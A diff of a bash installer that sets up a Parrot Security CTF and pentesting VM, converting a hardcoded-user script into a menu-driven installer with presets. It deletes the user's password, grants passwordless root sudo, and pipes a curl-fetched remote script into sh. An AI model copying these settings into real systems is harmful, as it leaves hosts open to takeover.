@@ -1,5 +1,3 @@
-#!/bin/bash
-
 # Parrot Security VM Enhancement Bootstrap Script
 # For fresh Parrot installs running as VM guest on Windows host
 # Version 2.4 (Current Production - Ultimate Power User/CTF)
@@ -14,14 +12,31 @@
 # updated 10/27/2025
 # ---------------------------
 
+#!/bin/bash
+
+# CTF Box Installer - Pentesting Toolkit Bootstrap v3.0
+# Modular installation system with component selection
+# Modern CTF Edition - 2025
+
 set -e
 
+# ============================================
+# CONFIGURATION
+# ============================================
+SCRIPT_VERSION="3.0"
+CONFIG_FILE="$HOME/.ctfbox.conf"
+DEFAULT_USERNAME="$USER"
+
+# Colors
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+MAGENTA='\033[0;35m'
 NC='\033[0m'
 
+# Logging functions
 log_info() {
   echo -e "${GREEN}[+]${NC} $1"
 }
@@ -35,31 +50,646 @@ log_progress() {
   echo -e "${BLUE}[*]${NC} $1"
 }
 
+# Progress indicator
 show_progress() {
-  local phase=$1
-  local total=8
-  local percent=$((phase * 100 / total))
-  echo -e "${BLUE}${NC}"
-  echo -e "${BLUE}${NC} Overall Progress: ${GREEN}${percent}%${NC} (Phase ${phase}/${total})        ${BLUE}${NC}"
-  echo -e "${BLUE}${NC}"
+  local current=$1
+  local total=$2
+  local percent=$((current * 100 / total))
+  echo ""
+  echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
+  echo -e "${BLUE}║${NC} Progress: ${GREEN}${percent}%${NC} (${current}/${total})${BLUE}                    ║${NC}"
+  echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
+  echo ""
 }
 
 # ============================================
-# PHASE 1: System Updates & Base Packages
+# WELCOME SCREEN
+# ============================================
+welcome_screen() {
+  clear
+  
+  echo -e "${CYAN}"
+  cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║    ██████╗████████╗███████╗    ██████╗  ██████╗ ██╗  ██╗    ║
+║   ██╔════╝╚══██╔══╝██╔════╝    ██╔══██╗██╔═══██╗╚██╗██╔╝    ║
+║   ██║        ██║   █████╗      ██████╔╝██║   ██║ ╚███╔╝     ║
+║   ██║        ██║   ██╔══╝      ██╔══██╗██║   ██║ ██╔██╗     ║
+║   ╚██████╗   ██║   ██║         ██████╔╝╚██████╔╝██╔╝ ██╗    ║
+║    ╚═════╝   ╚═╝   ╚═╝         ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ║
+EOF
+  echo -e "${GREEN}"
+  cat << "EOF"
+║                                                               ║
+║           PENTESTING TOOLKIT INSTALLER v3.0                  ║
+║              Modern CTF Edition - 2025                       ║
+║                                                               ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+  echo -e "${NC}"
+  
+  echo ""
+  echo -e "${YELLOW}[*]${NC} Welcome to the CTF Pentesting Toolkit Installer!"
+  echo ""
+  echo "This script will set up a complete offensive security environment with:"
+  echo -e "  ${GREEN}•${NC} 40+ pentesting tools (Python, Go, Ruby)"
+  echo -e "  ${GREEN}•${NC} 12 essential exploit/payload repositories"
+  echo -e "  ${GREEN}•${NC} Modern shell environment (Zsh + Powerlevel10k)"
+  echo -e "  ${GREEN}•${NC} Automated workflows and scripts"
+  echo ""
+  
+  # Username configuration
+  configure_username
+}
+
+# ============================================
+# USERNAME CONFIGURATION
+# ============================================
+validate_username() {
+  local username=$1
+  
+  # Check format
+  if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]]; then
+    log_error "Invalid username format!"
+    echo "Username must:"
+    echo "  - Start with lowercase letter or underscore"
+    echo "  - Contain only lowercase letters, numbers, underscore, or dash"
+    echo "  - Be 1-32 characters long"
+    return 1
+  fi
+  
+  # Check if reserved
+  local reserved=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "nobody")
+  for reserved_name in "${reserved[@]}"; do
+    if [[ "$username" == "$reserved_name" ]]; then
+      log_error "Cannot use reserved username: $username"
+      return 1
+    fi
+  done
+  
+  return 0
+}
+
+configure_username() {
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo -e "${CYAN}USER CONFIGURATION${NC}"
+  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+  echo ""
+  
+  # Check for existing config
+  if [ -f "$CONFIG_FILE" ]; then
+    source "$CONFIG_FILE"
+    log_info "Found existing config: Username=${USERNAME}"
+    read -p "Use this username? (y/n): " use_existing
+    if [[ "$use_existing" == "y" || "$use_existing" == "Y" ]]; then
+      export USERNAME
+      export USER_HOME="/home/$USERNAME"
+      log_info "Using username: $USERNAME"
+      echo ""
+      read -p "Press Enter to continue..."
+      return
+    fi
+  fi
+  
+  # Get username from user
+  while true; do
+    read -p "Enter username for pentesting user [default: $DEFAULT_USERNAME]: " USERNAME
+    USERNAME=${USERNAME:-$DEFAULT_USERNAME}
+    
+    if validate_username "$USERNAME"; then
+      break
+    fi
+    echo ""
+  done
+  
+  export USERNAME
+  export USER_HOME="/home/$USERNAME"
+  
+  echo ""
+  log_info "✓ Username set to: ${GREEN}$USERNAME${NC}"
+  log_info "✓ Home directory: ${GREEN}$USER_HOME${NC}"
+  echo ""
+  
+  read -p "Press Enter to continue to main menu..."
+}
+
+# ============================================
+# CONFIGURATION MANAGEMENT
+# ============================================
+save_config() {
+  cat > "$CONFIG_FILE" << CONF_EOF
+# CTF Box Installer Configuration
+# Generated: $(date)
+
+USERNAME="$USERNAME"
+USER_HOME="$USER_HOME"
+
+# Component Selection
+SYSTEM_UPDATES=${SYSTEM_UPDATES:-true}
+USER_SETUP=${USER_SETUP:-true}
+SHELL_ENVIRONMENT=${SHELL_ENVIRONMENT:-true}
+CORE_TOOLS=${CORE_TOOLS:-true}
+WEB_ENUMERATION=${WEB_ENUMERATION:-true}
+WINDOWS_AD=${WINDOWS_AD:-true}
+WIRELESS=${WIRELESS:-false}
+POSTEXPLOIT=${POSTEXPLOIT:-true}
+FORENSICS_STEGO=${FORENSICS_STEGO:-false}
+BINARY_EXPLOITATION=${BINARY_EXPLOITATION:-false}
+WORDLISTS=${WORDLISTS:-true}
+REPOS_ESSENTIAL=${REPOS_ESSENTIAL:-true}
+REPOS_PRIVILEGE=${REPOS_PRIVILEGE:-true}
+FIREFOX_EXTENSIONS=${FIREFOX_EXTENSIONS:-true}
+AUTOMATION_SCRIPTS=${AUTOMATION_SCRIPTS:-true}
+CONF_EOF
+
+  log_info "Configuration saved to $CONFIG_FILE"
+}
+
+load_config() {
+  if [ -f "$CONFIG_FILE" ]; then
+    source "$CONFIG_FILE"
+    log_info "Loaded configuration from $CONFIG_FILE"
+  fi
+}
+
+# ============================================
+# MAIN MENU
+# ============================================
+show_main_menu() {
+  while true; do
+    clear
+    echo -e "${CYAN}"
+    cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                      CTF BOX INSTALLER                        ║
+║                    Main Menu - v3.0                           ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    echo ""
+    echo -e "${GREEN}Current User:${NC} $USERNAME"
+    echo ""
+    echo "1) 🚀 Full Installation (All Components)"
+    echo "2) ⚙️  Custom Installation (Choose Components)"
+    echo "3) 📦 Quick Presets (Web/Windows/CTF/Minimal)"
+    echo "4) 👤 Change Username (Current: $USERNAME)"
+    echo "5) 🔧 Update Existing Installation"
+    echo "0) ❌ Exit"
+    echo ""
+    read -p "Select option [0-5]: " choice
+    
+    case $choice in
+      1) install_full ;;
+      2) show_component_menu ;;
+      3) show_presets_menu ;;
+      4) configure_username ;;
+      5) update_installation ;;
+      0) 
+        echo ""
+        log_info "Exiting installer. Stay safe out there! 🏴‍☠️"
+        exit 0
+        ;;
+      *)
+        log_error "Invalid option. Please select 0-5."
+        sleep 2
+        ;;
+    esac
+  done
+}
+
+# ============================================
+# INSTALLATION PRESETS
+# ============================================
+show_presets_menu() {
+  clear
+  echo -e "${CYAN}"
+  cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                    INSTALLATION PRESETS                       ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+  echo -e "${NC}"
+  echo ""
+  echo "1) 🌐 Web Pentesting (Recon, enumeration, fuzzing)"
+  echo "2) 🪟  Windows/AD Focus (NetExec, Impacket, Bloodhound)"
+  echo "3) 🏆 CTF Player (Crypto, stego, forensics, binary)"
+  echo "4) ⚡ Minimal Setup (Core tools only, no extras)"
+  echo "5) 🔙 Back to Main Menu"
+  echo ""
+  read -p "Select preset [1-5]: " preset
+  
+  case $preset in
+    1) preset_web ;;
+    2) preset_windows ;;
+    3) preset_ctf ;;
+    4) preset_minimal ;;
+    5) return ;;
+    *)
+      log_error "Invalid option"
+      sleep 2
+      show_presets_menu
+      ;;
+  esac
+}
+
+preset_web() {
+  SYSTEM_UPDATES=true
+  USER_SETUP=true
+  SHELL_ENVIRONMENT=true
+  CORE_TOOLS=true
+  WEB_ENUMERATION=true
+  WINDOWS_AD=false
+  WIRELESS=false
+  POSTEXPLOIT=true
+  FORENSICS_STEGO=false
+  BINARY_EXPLOITATION=false
+  WORDLISTS=true
+  REPOS_ESSENTIAL=true
+  REPOS_PRIVILEGE=false
+  FIREFOX_EXTENSIONS=true
+  AUTOMATION_SCRIPTS=true
+  
+  log_info "Web Pentesting preset selected"
+  save_config
+  confirm_and_install
+}
+
+preset_windows() {
+  SYSTEM_UPDATES=true
+  USER_SETUP=true
+  SHELL_ENVIRONMENT=true
+  CORE_TOOLS=true
+  WEB_ENUMERATION=false
+  WINDOWS_AD=true
+  WIRELESS=false
+  POSTEXPLOIT=true
+  FORENSICS_STEGO=false
+  BINARY_EXPLOITATION=false
+  WORDLISTS=true
+  REPOS_ESSENTIAL=true
+  REPOS_PRIVILEGE=true
+  FIREFOX_EXTENSIONS=false
+  AUTOMATION_SCRIPTS=true
+  
+  log_info "Windows/AD preset selected"
+  save_config
+  confirm_and_install
+}
+
+preset_ctf() {
+  SYSTEM_UPDATES=true
+  USER_SETUP=true
+  SHELL_ENVIRONMENT=true
+  CORE_TOOLS=true
+  WEB_ENUMERATION=true
+  WINDOWS_AD=true
+  WIRELESS=false
+  POSTEXPLOIT=true
+  FORENSICS_STEGO=true
+  BINARY_EXPLOITATION=true
+  WORDLISTS=true
+  REPOS_ESSENTIAL=true
+  REPOS_PRIVILEGE=true
+  FIREFOX_EXTENSIONS=true
+  AUTOMATION_SCRIPTS=true
+  
+  log_info "CTF Player preset selected (Full install)"
+  save_config
+  confirm_and_install
+}
+
+preset_minimal() {
+  SYSTEM_UPDATES=false
+  USER_SETUP=true
+  SHELL_ENVIRONMENT=true
+  CORE_TOOLS=true
+  WEB_ENUMERATION=false
+  WINDOWS_AD=false
+  WIRELESS=false
+  POSTEXPLOIT=false
+  FORENSICS_STEGO=false
+  BINARY_EXPLOITATION=false
+  WORDLISTS=false
+  REPOS_ESSENTIAL=false
+  REPOS_PRIVILEGE=false
+  FIREFOX_EXTENSIONS=false
+  AUTOMATION_SCRIPTS=false
+  
+  log_info "Minimal preset selected"
+  save_config
+  confirm_and_install
+}
+
+# ============================================
+# COMPONENT SELECTION MENU
+# ============================================
+show_component_menu() {
+  load_config
+  
+  while true; do
+    clear
+    echo -e "${CYAN}"
+    cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                   COMPONENT SELECTION                         ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    echo ""
+    echo "Toggle components (Y=enabled, N=disabled):"
+    echo ""
+    echo "━━━━ SYSTEM SETUP ━━━━"
+    echo " 1) System Updates & Base Packages        [$([ "$SYSTEM_UPDATES" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 2) User Setup ($USERNAME)                 [$([ "$USER_SETUP" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 3) Shell Environment (Zsh + p10k)        [$([ "$SHELL_ENVIRONMENT" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo ""
+    echo "━━━━ TOOL CATEGORIES ━━━━"
+    echo " 4) Core Tools (Python/Go/Ruby base)     [$([ "$CORE_TOOLS" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 5) Web Enumeration (ffuf, nuclei, etc)  [$([ "$WEB_ENUMERATION" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 6) Windows/AD Tools (NetExec, Impacket) [$([ "$WINDOWS_AD" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 7) Wireless Tools (aircrack-ng, etc)    [$([ "$WIRELESS" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 8) Post-Exploitation (Penelope, etc)    [$([ "$POSTEXPLOIT" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo " 9) Forensics & Stego                    [$([ "$FORENSICS_STEGO" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo "10) Binary Exploitation                  [$([ "$BINARY_EXPLOITATION" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo "11) Wordlists (SecLists, rockyou)        [$([ "$WORDLISTS" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo ""
+    echo "━━━━ REPOSITORIES ━━━━"
+    echo "12) Essential Repos (PayloadsAllTheThings, PEASS, HackTricks) [$([ "$REPOS_ESSENTIAL" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo "13) Privilege Escalation Repos (GTFOBins, LOLBAS)             [$([ "$REPOS_PRIVILEGE" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo ""
+    echo "━━━━ EXTRAS ━━━━"
+    echo "14) Firefox Extensions                   [$([ "$FIREFOX_EXTENSIONS" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo "15) Automation Scripts                   [$([ "$AUTOMATION_SCRIPTS" = "true" ] && echo -e "${GREEN}Y${NC}" || echo -e "${RED}N${NC}")]"
+    echo ""
+    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo ""
+    echo " A) Select All"
+    echo " N) Select None"
+    echo " C) Continue with Installation"
+    echo " S) Save Configuration & Exit"
+    echo " Q) Back to Main Menu"
+    echo ""
+    read -p "Select option: " comp_choice
+    
+    case $comp_choice in
+      1) SYSTEM_UPDATES=$([ "$SYSTEM_UPDATES" = "true" ] && echo "false" || echo "true") ;;
+      2) USER_SETUP=$([ "$USER_SETUP" = "true" ] && echo "false" || echo "true") ;;
+      3) SHELL_ENVIRONMENT=$([ "$SHELL_ENVIRONMENT" = "true" ] && echo "false" || echo "true") ;;
+      4) CORE_TOOLS=$([ "$CORE_TOOLS" = "true" ] && echo "false" || echo "true") ;;
+      5) WEB_ENUMERATION=$([ "$WEB_ENUMERATION" = "true" ] && echo "false" || echo "true") ;;
+      6) WINDOWS_AD=$([ "$WINDOWS_AD" = "true" ] && echo "false" || echo "true") ;;
+      7) WIRELESS=$([ "$WIRELESS" = "true" ] && echo "false" || echo "true") ;;
+      8) POSTEXPLOIT=$([ "$POSTEXPLOIT" = "true" ] && echo "false" || echo "true") ;;
+      9) FORENSICS_STEGO=$([ "$FORENSICS_STEGO" = "true" ] && echo "false" || echo "true") ;;
+      10) BINARY_EXPLOITATION=$([ "$BINARY_EXPLOITATION" = "true" ] && echo "false" || echo "true") ;;
+      11) WORDLISTS=$([ "$WORDLISTS" = "true" ] && echo "false" || echo "true") ;;
+      12) REPOS_ESSENTIAL=$([ "$REPOS_ESSENTIAL" = "true" ] && echo "false" || echo "true") ;;
+      13) REPOS_PRIVILEGE=$([ "$REPOS_PRIVILEGE" = "true" ] && echo "false" || echo "true") ;;
+      14) FIREFOX_EXTENSIONS=$([ "$FIREFOX_EXTENSIONS" = "true" ] && echo "false" || echo "true") ;;
+      15) AUTOMATION_SCRIPTS=$([ "$AUTOMATION_SCRIPTS" = "true" ] && echo "false" || echo "true") ;;
+      [Aa])
+        SYSTEM_UPDATES=true USER_SETUP=true SHELL_ENVIRONMENT=true CORE_TOOLS=true
+        WEB_ENUMERATION=true WINDOWS_AD=true WIRELESS=true POSTEXPLOIT=true
+        FORENSICS_STEGO=true BINARY_EXPLOITATION=true WORDLISTS=true
+        REPOS_ESSENTIAL=true REPOS_PRIVILEGE=true FIREFOX_EXTENSIONS=true AUTOMATION_SCRIPTS=true
+        log_info "All components selected"
+        sleep 1
+        ;;
+      [Nn])
+        SYSTEM_UPDATES=false USER_SETUP=false SHELL_ENVIRONMENT=false CORE_TOOLS=false
+        WEB_ENUMERATION=false WINDOWS_AD=false WIRELESS=false POSTEXPLOIT=false
+        FORENSICS_STEGO=false BINARY_EXPLOITATION=false WORDLISTS=false
+        REPOS_ESSENTIAL=false REPOS_PRIVILEGE=false FIREFOX_EXTENSIONS=false AUTOMATION_SCRIPTS=false
+        log_info "All components deselected"
+        sleep 1
+        ;;
+      [Cc])
+        save_config
+        confirm_and_install
+        return
+        ;;
+      [Ss])
+        save_config
+        log_info "Configuration saved!"
+        sleep 2
+        return
+        ;;
+      [Qq])
+        return
+        ;;
+      *)
+        log_error "Invalid option"
+        sleep 1
+        ;;
+    esac
+  done
+}
+
+# ============================================
+# INSTALLATION CONFIRMATION
+# ============================================
+confirm_and_install() {
+  clear
+  echo -e "${CYAN}"
+  cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                 INSTALLATION SUMMARY                          ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+  echo -e "${NC}"
+  echo ""
+  echo -e "${GREEN}Username:${NC} $USERNAME"
+  echo -e "${GREEN}Home Directory:${NC} $USER_HOME"
+  echo ""
+  echo "Selected Components:"
+  
+  [ "$SYSTEM_UPDATES" = "true" ] && echo -e "  ${GREEN}✓${NC} System Updates & Base Packages"
+  [ "$USER_SETUP" = "true" ] && echo -e "  ${GREEN}✓${NC} User Setup"
+  [ "$SHELL_ENVIRONMENT" = "true" ] && echo -e "  ${GREEN}✓${NC} Shell Environment"
+  [ "$CORE_TOOLS" = "true" ] && echo -e "  ${GREEN}✓${NC} Core Tools"
+  [ "$WEB_ENUMERATION" = "true" ] && echo -e "  ${GREEN}✓${NC} Web Enumeration"
+  [ "$WINDOWS_AD" = "true" ] && echo -e "  ${GREEN}✓${NC} Windows/AD Tools"
+  [ "$WIRELESS" = "true" ] && echo -e "  ${GREEN}✓${NC} Wireless Tools"
+  [ "$POSTEXPLOIT" = "true" ] && echo -e "  ${GREEN}✓${NC} Post-Exploitation"
+  [ "$FORENSICS_STEGO" = "true" ] && echo -e "  ${GREEN}✓${NC} Forensics & Stego"
+  [ "$BINARY_EXPLOITATION" = "true" ] && echo -e "  ${GREEN}✓${NC} Binary Exploitation"
+  [ "$WORDLISTS" = "true" ] && echo -e "  ${GREEN}✓${NC} Wordlists"
+  [ "$REPOS_ESSENTIAL" = "true" ] && echo -e "  ${GREEN}✓${NC} Essential Repositories"
+  [ "$REPOS_PRIVILEGE" = "true" ] && echo -e "  ${GREEN}✓${NC} Privilege Escalation Repos"
+  [ "$FIREFOX_EXTENSIONS" = "true" ] && echo -e "  ${GREEN}✓${NC} Firefox Extensions"
+  [ "$AUTOMATION_SCRIPTS" = "true" ] && echo -e "  ${GREEN}✓${NC} Automation Scripts"
+  
+  echo ""
+  echo -e "${YELLOW}⚠️  This installation will take 10-30 minutes depending on your connection.${NC}"
+  echo ""
+  read -p "Proceed with installation? (yes/no): " confirm
+  
+  if [[ "$confirm" == "yes" || "$confirm" == "y" || "$confirm" == "Y" ]]; then
+    run_installation
+  else
+    log_info "Installation cancelled"
+    sleep 2
+  fi
+}
+
+# ============================================
+# FULL INSTALLATION
+# ============================================
+install_full() {
+  # Enable all components
+  SYSTEM_UPDATES=true
+  USER_SETUP=true
+  SHELL_ENVIRONMENT=true
+  CORE_TOOLS=true
+  WEB_ENUMERATION=true
+  WINDOWS_AD=true
+  WIRELESS=true
+  POSTEXPLOIT=true
+  FORENSICS_STEGO=true
+  BINARY_EXPLOITATION=true
+  WORDLISTS=true
+  REPOS_ESSENTIAL=true
+  REPOS_PRIVILEGE=true
+  FIREFOX_EXTENSIONS=true
+  AUTOMATION_SCRIPTS=true
+  
+  save_config
+  confirm_and_install
+}
+
+# ============================================
+# UPDATE EXISTING INSTALLATION
+# ============================================
+update_installation() {
+  clear
+  echo -e "${CYAN}"
+  cat << "EOF"
+╔═══════════════════════════════════════════════════════════════╗
+║                  UPDATE INSTALLATION                          ║
+╚═══════════════════════════════════════════════════════════════╝
+EOF
+  echo -e "${NC}"
+  echo ""
+  log_info "This will update all installed tools and repositories"
+  echo ""
+  read -p "Continue? (y/n): " update_confirm
+  
+  if [[ "$update_confirm" == "y" || "$update_confirm" == "Y" ]]; then
+    log_progress "Running update script..."
+    if [ -f "$USER_HOME/scripts/update-tools.sh" ]; then
+      bash "$USER_HOME/scripts/update-tools.sh"
+    else
+      log_error "Update script not found. Run full installation first."
+    fi
+  fi
+  
+  read -p "Press Enter to continue..."
+}
+
+# ============================================
+# MAIN INSTALLATION RUNNER
+# ============================================
+run_installation() {
+  clear
+  log_info "Starting CTF Box Installation..."
+  log_info "Installation log: /var/log/ctfbox-install.log"
+  sleep 2
+  
+  # Calculate total phases
+  TOTAL_PHASES=0
+  [ "$SYSTEM_UPDATES" = "true" ] && ((TOTAL_PHASES++))
+  [ "$USER_SETUP" = "true" ] && ((TOTAL_PHASES++))
+  [ "$SHELL_ENVIRONMENT" = "true" ] && ((TOTAL_PHASES++))
+  # Core tools phase always runs if any tool category is selected
+  if [ "$CORE_TOOLS" = "true" ] || [ "$WEB_ENUMERATION" = "true" ] || [ "$WINDOWS_AD" = "true" ] || \
+     [ "$WIRELESS" = "true" ] || [ "$POSTEXPLOIT" = "true" ] || [ "$FORENSICS_STEGO" = "true" ] || \
+     [ "$BINARY_EXPLOITATION" = "true" ]; then
+    ((TOTAL_PHASES++))
+  fi
+  [ "$WORDLISTS" = "true" ] && ((TOTAL_PHASES++))
+  [ "$REPOS_ESSENTIAL" = "true" ] || [ "$REPOS_PRIVILEGE" = "true" ] && ((TOTAL_PHASES++))
+  [ "$FIREFOX_EXTENSIONS" = "true" ] && ((TOTAL_PHASES++))
+  [ "$AUTOMATION_SCRIPTS" = "true" ] && ((TOTAL_PHASES++))
+  ((TOTAL_PHASES++)) # Cleanup phase
+  
+  CURRENT_PHASE=0
+  
+  # Run selected phases
+  [ "$SYSTEM_UPDATES" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase1_system_setup
+  }
+  
+  [ "$USER_SETUP" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase2_user_setup
+  }
+  
+  [ "$SHELL_ENVIRONMENT" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase3_shell_setup
+  }
+  
+  # Tool installation phase (modular)
+  if [ "$CORE_TOOLS" = "true" ] || [ "$WEB_ENUMERATION" = "true" ] || [ "$WINDOWS_AD" = "true" ] || \
+     [ "$WIRELESS" = "true" ] || [ "$POSTEXPLOIT" = "true" ] || [ "$FORENSICS_STEGO" = "true" ] || \
+     [ "$BINARY_EXPLOITATION" = "true" ]; then
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase4_tools_setup
+  fi
+  
+  [ "$WORDLISTS" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase5_wordlists_setup
+  }
+  
+  if [ "$REPOS_ESSENTIAL" = "true" ] || [ "$REPOS_PRIVILEGE" = "true" ]; then
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase6_repos_setup
+  fi
+  
+  [ "$FIREFOX_EXTENSIONS" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase7_firefox_extensions
+  }
+  
+  [ "$AUTOMATION_SCRIPTS" = "true" ] && {
+    ((CURRENT_PHASE++))
+    show_progress $CURRENT_PHASE $TOTAL_PHASES
+    phase8_automation_setup
+  }
+  
+  # Final cleanup always runs
+  ((CURRENT_PHASE++))
+  show_progress $CURRENT_PHASE $TOTAL_PHASES
+  phase_final_cleanup
+  
+  show_completion_message
+}
+
+# ============================================
+# PHASE 1: SYSTEM UPDATES & BASE PACKAGES
 # ============================================
 phase1_system_setup() {
-  show_progress 1
-  log_progress "Phase 1/8: System Updates & Base Packages..."
-  log_info "Phase 1: Updating system and installing base packages"
- 
+  log_progress "Phase: System Updates & Base Packages"
+  log_info "Updating system and installing base packages..."
+  
   log_progress "Updating package lists..."
-  DEBIAN_FRONTEND=noninteractive apt update
- 
+  DEBIAN_FRONTEND=noninteractive apt update -qq
+  
   log_progress "Upgrading installed packages (this may take a while)..."
-  DEBIAN_FRONTEND=noninteractive apt upgrade -y
- 
+  DEBIAN_FRONTEND=noninteractive apt upgrade -y -qq
+  
   log_progress "Installing base packages..."
-  DEBIAN_FRONTEND=noninteractive apt install -y \
+  DEBIAN_FRONTEND=noninteractive apt install -y -qq \
     build-essential git curl wget \
     vim neovim tmux zsh \
     python3-pip python3-venv \
@@ -68,261 +698,402 @@ phase1_system_setup() {
     jq ripgrep fd-find bat \
     htop ncdu tree \
     fonts-powerline \
-    silversearcher-ag
- 
-  log_info "Phase 1 complete"
-  log_progress "Phase 1/8:  Complete"
+    silversearcher-ag \
+    2>&1 | tee -a /var/log/ctfbox-install.log
+  
+  log_info "✓ System setup complete"
 }
 
 # ============================================
-# PHASE 2: User Setup
+# PHASE 2: USER SETUP
 # ============================================
 phase2_user_setup() {
-  show_progress 2
-  log_progress "Phase 2/8: User Account Setup..."
-  log_info "Phase 2: Setting up user account"
- 
-  # Create jamie user as essentially root
-  if ! id "jamie" &>/dev/null; then
-    # Use bash for initial setup compatibility, switch to zsh later
-    useradd -m -s /bin/bash -G sudo jamie
-    passwd -d jamie # Remove password for auto-login
-    chage -d 0 jamie # Force user to set a password on first shell login (mitigation)
-   
-    # Give jamie full root privileges without password (for convenience/autologin)
-    echo "jamie ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/jamie
-    chmod 440 /etc/sudoers.d/jamie
-   
-    log_info "User 'jamie' created. Password disabled for auto-login, but password change required on first login."
+  log_progress "Phase: User Account Setup"
+  log_info "Setting up user account: $USERNAME"
+  
+  # Create user if doesn't exist
+  if ! id "$USERNAME" &>/dev/null; then
+    useradd -m -s /bin/bash -G sudo "$USERNAME"
+    passwd -d "$USERNAME"
+    chage -d 0 "$USERNAME"
+    
+    echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/"$USERNAME"
+    chmod 440 /etc/sudoers.d/"$USERNAME"
+    
+    log_info "User '$USERNAME' created with sudo privileges"
   else
-    log_warn "User 'jamie' already exists, skipping creation"
+    log_warn "User '$USERNAME' already exists, updating configuration"
   fi
- 
-  # Enable docker without sudo
-  usermod -aG docker jamie || true
- 
-  # Set up home directory
-  export USER_HOME=/home/jamie
- 
-  log_info "Phase 2 complete"
-  log_progress "Phase 2/8:  Complete"
+  
+  usermod -aG docker "$USERNAME" 2>/dev/null || true
+  export USER_HOME="/home/$USERNAME"
+  
+  log_info "✓ User setup complete"
 }
 
 # ============================================
-# PHASE 3: Shell Environment (Zsh + Oh-My-Zsh)
+# PHASE 3: SHELL ENVIRONMENT
 # ============================================
 phase3_shell_setup() {
-  show_progress 3
-  log_progress "Phase 3/8: Shell Environment (Zsh + Oh-My-Zsh + p10k)..."
-  log_info "Phase 3: Setting up Zsh and Oh-My-Zsh for jamie"
- 
-  # Switch to jamie's home for installations
+  log_progress "Phase: Shell Environment (Zsh + Oh-My-Zsh + p10k)"
+  log_info "Setting up Zsh and Oh-My-Zsh for $USERNAME"
+  
+  # Switch to user's home
   export HOME=$USER_HOME
   cd $USER_HOME
- 
+  
   # Install Oh-My-Zsh
   if [ ! -d "$USER_HOME/.oh-my-zsh" ]; then
     log_progress "Installing Oh-My-Zsh..."
-    sudo -u jamie sh -c "RUNZSH=no $(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
+    sudo -u "$USERNAME" sh -c "RUNZSH=no $(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended 2>&1 | tee -a /var/log/ctfbox-install.log
   fi
- 
-  # Install zsh-autosuggestions
-  log_progress "Installing zsh-autosuggestions..."
-  sudo -u jamie git clone https://github.com/zsh-users/zsh-autosuggestions ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-autosuggestions 2>/dev/null || true
- 
-  # Install zsh-syntax-highlighting
-  log_progress "Installing zsh-syntax-highlighting..."
-  sudo -u jamie git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${USER_HOME}/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 2>/dev/null || true
- 
+  
+  # Install zsh plugins
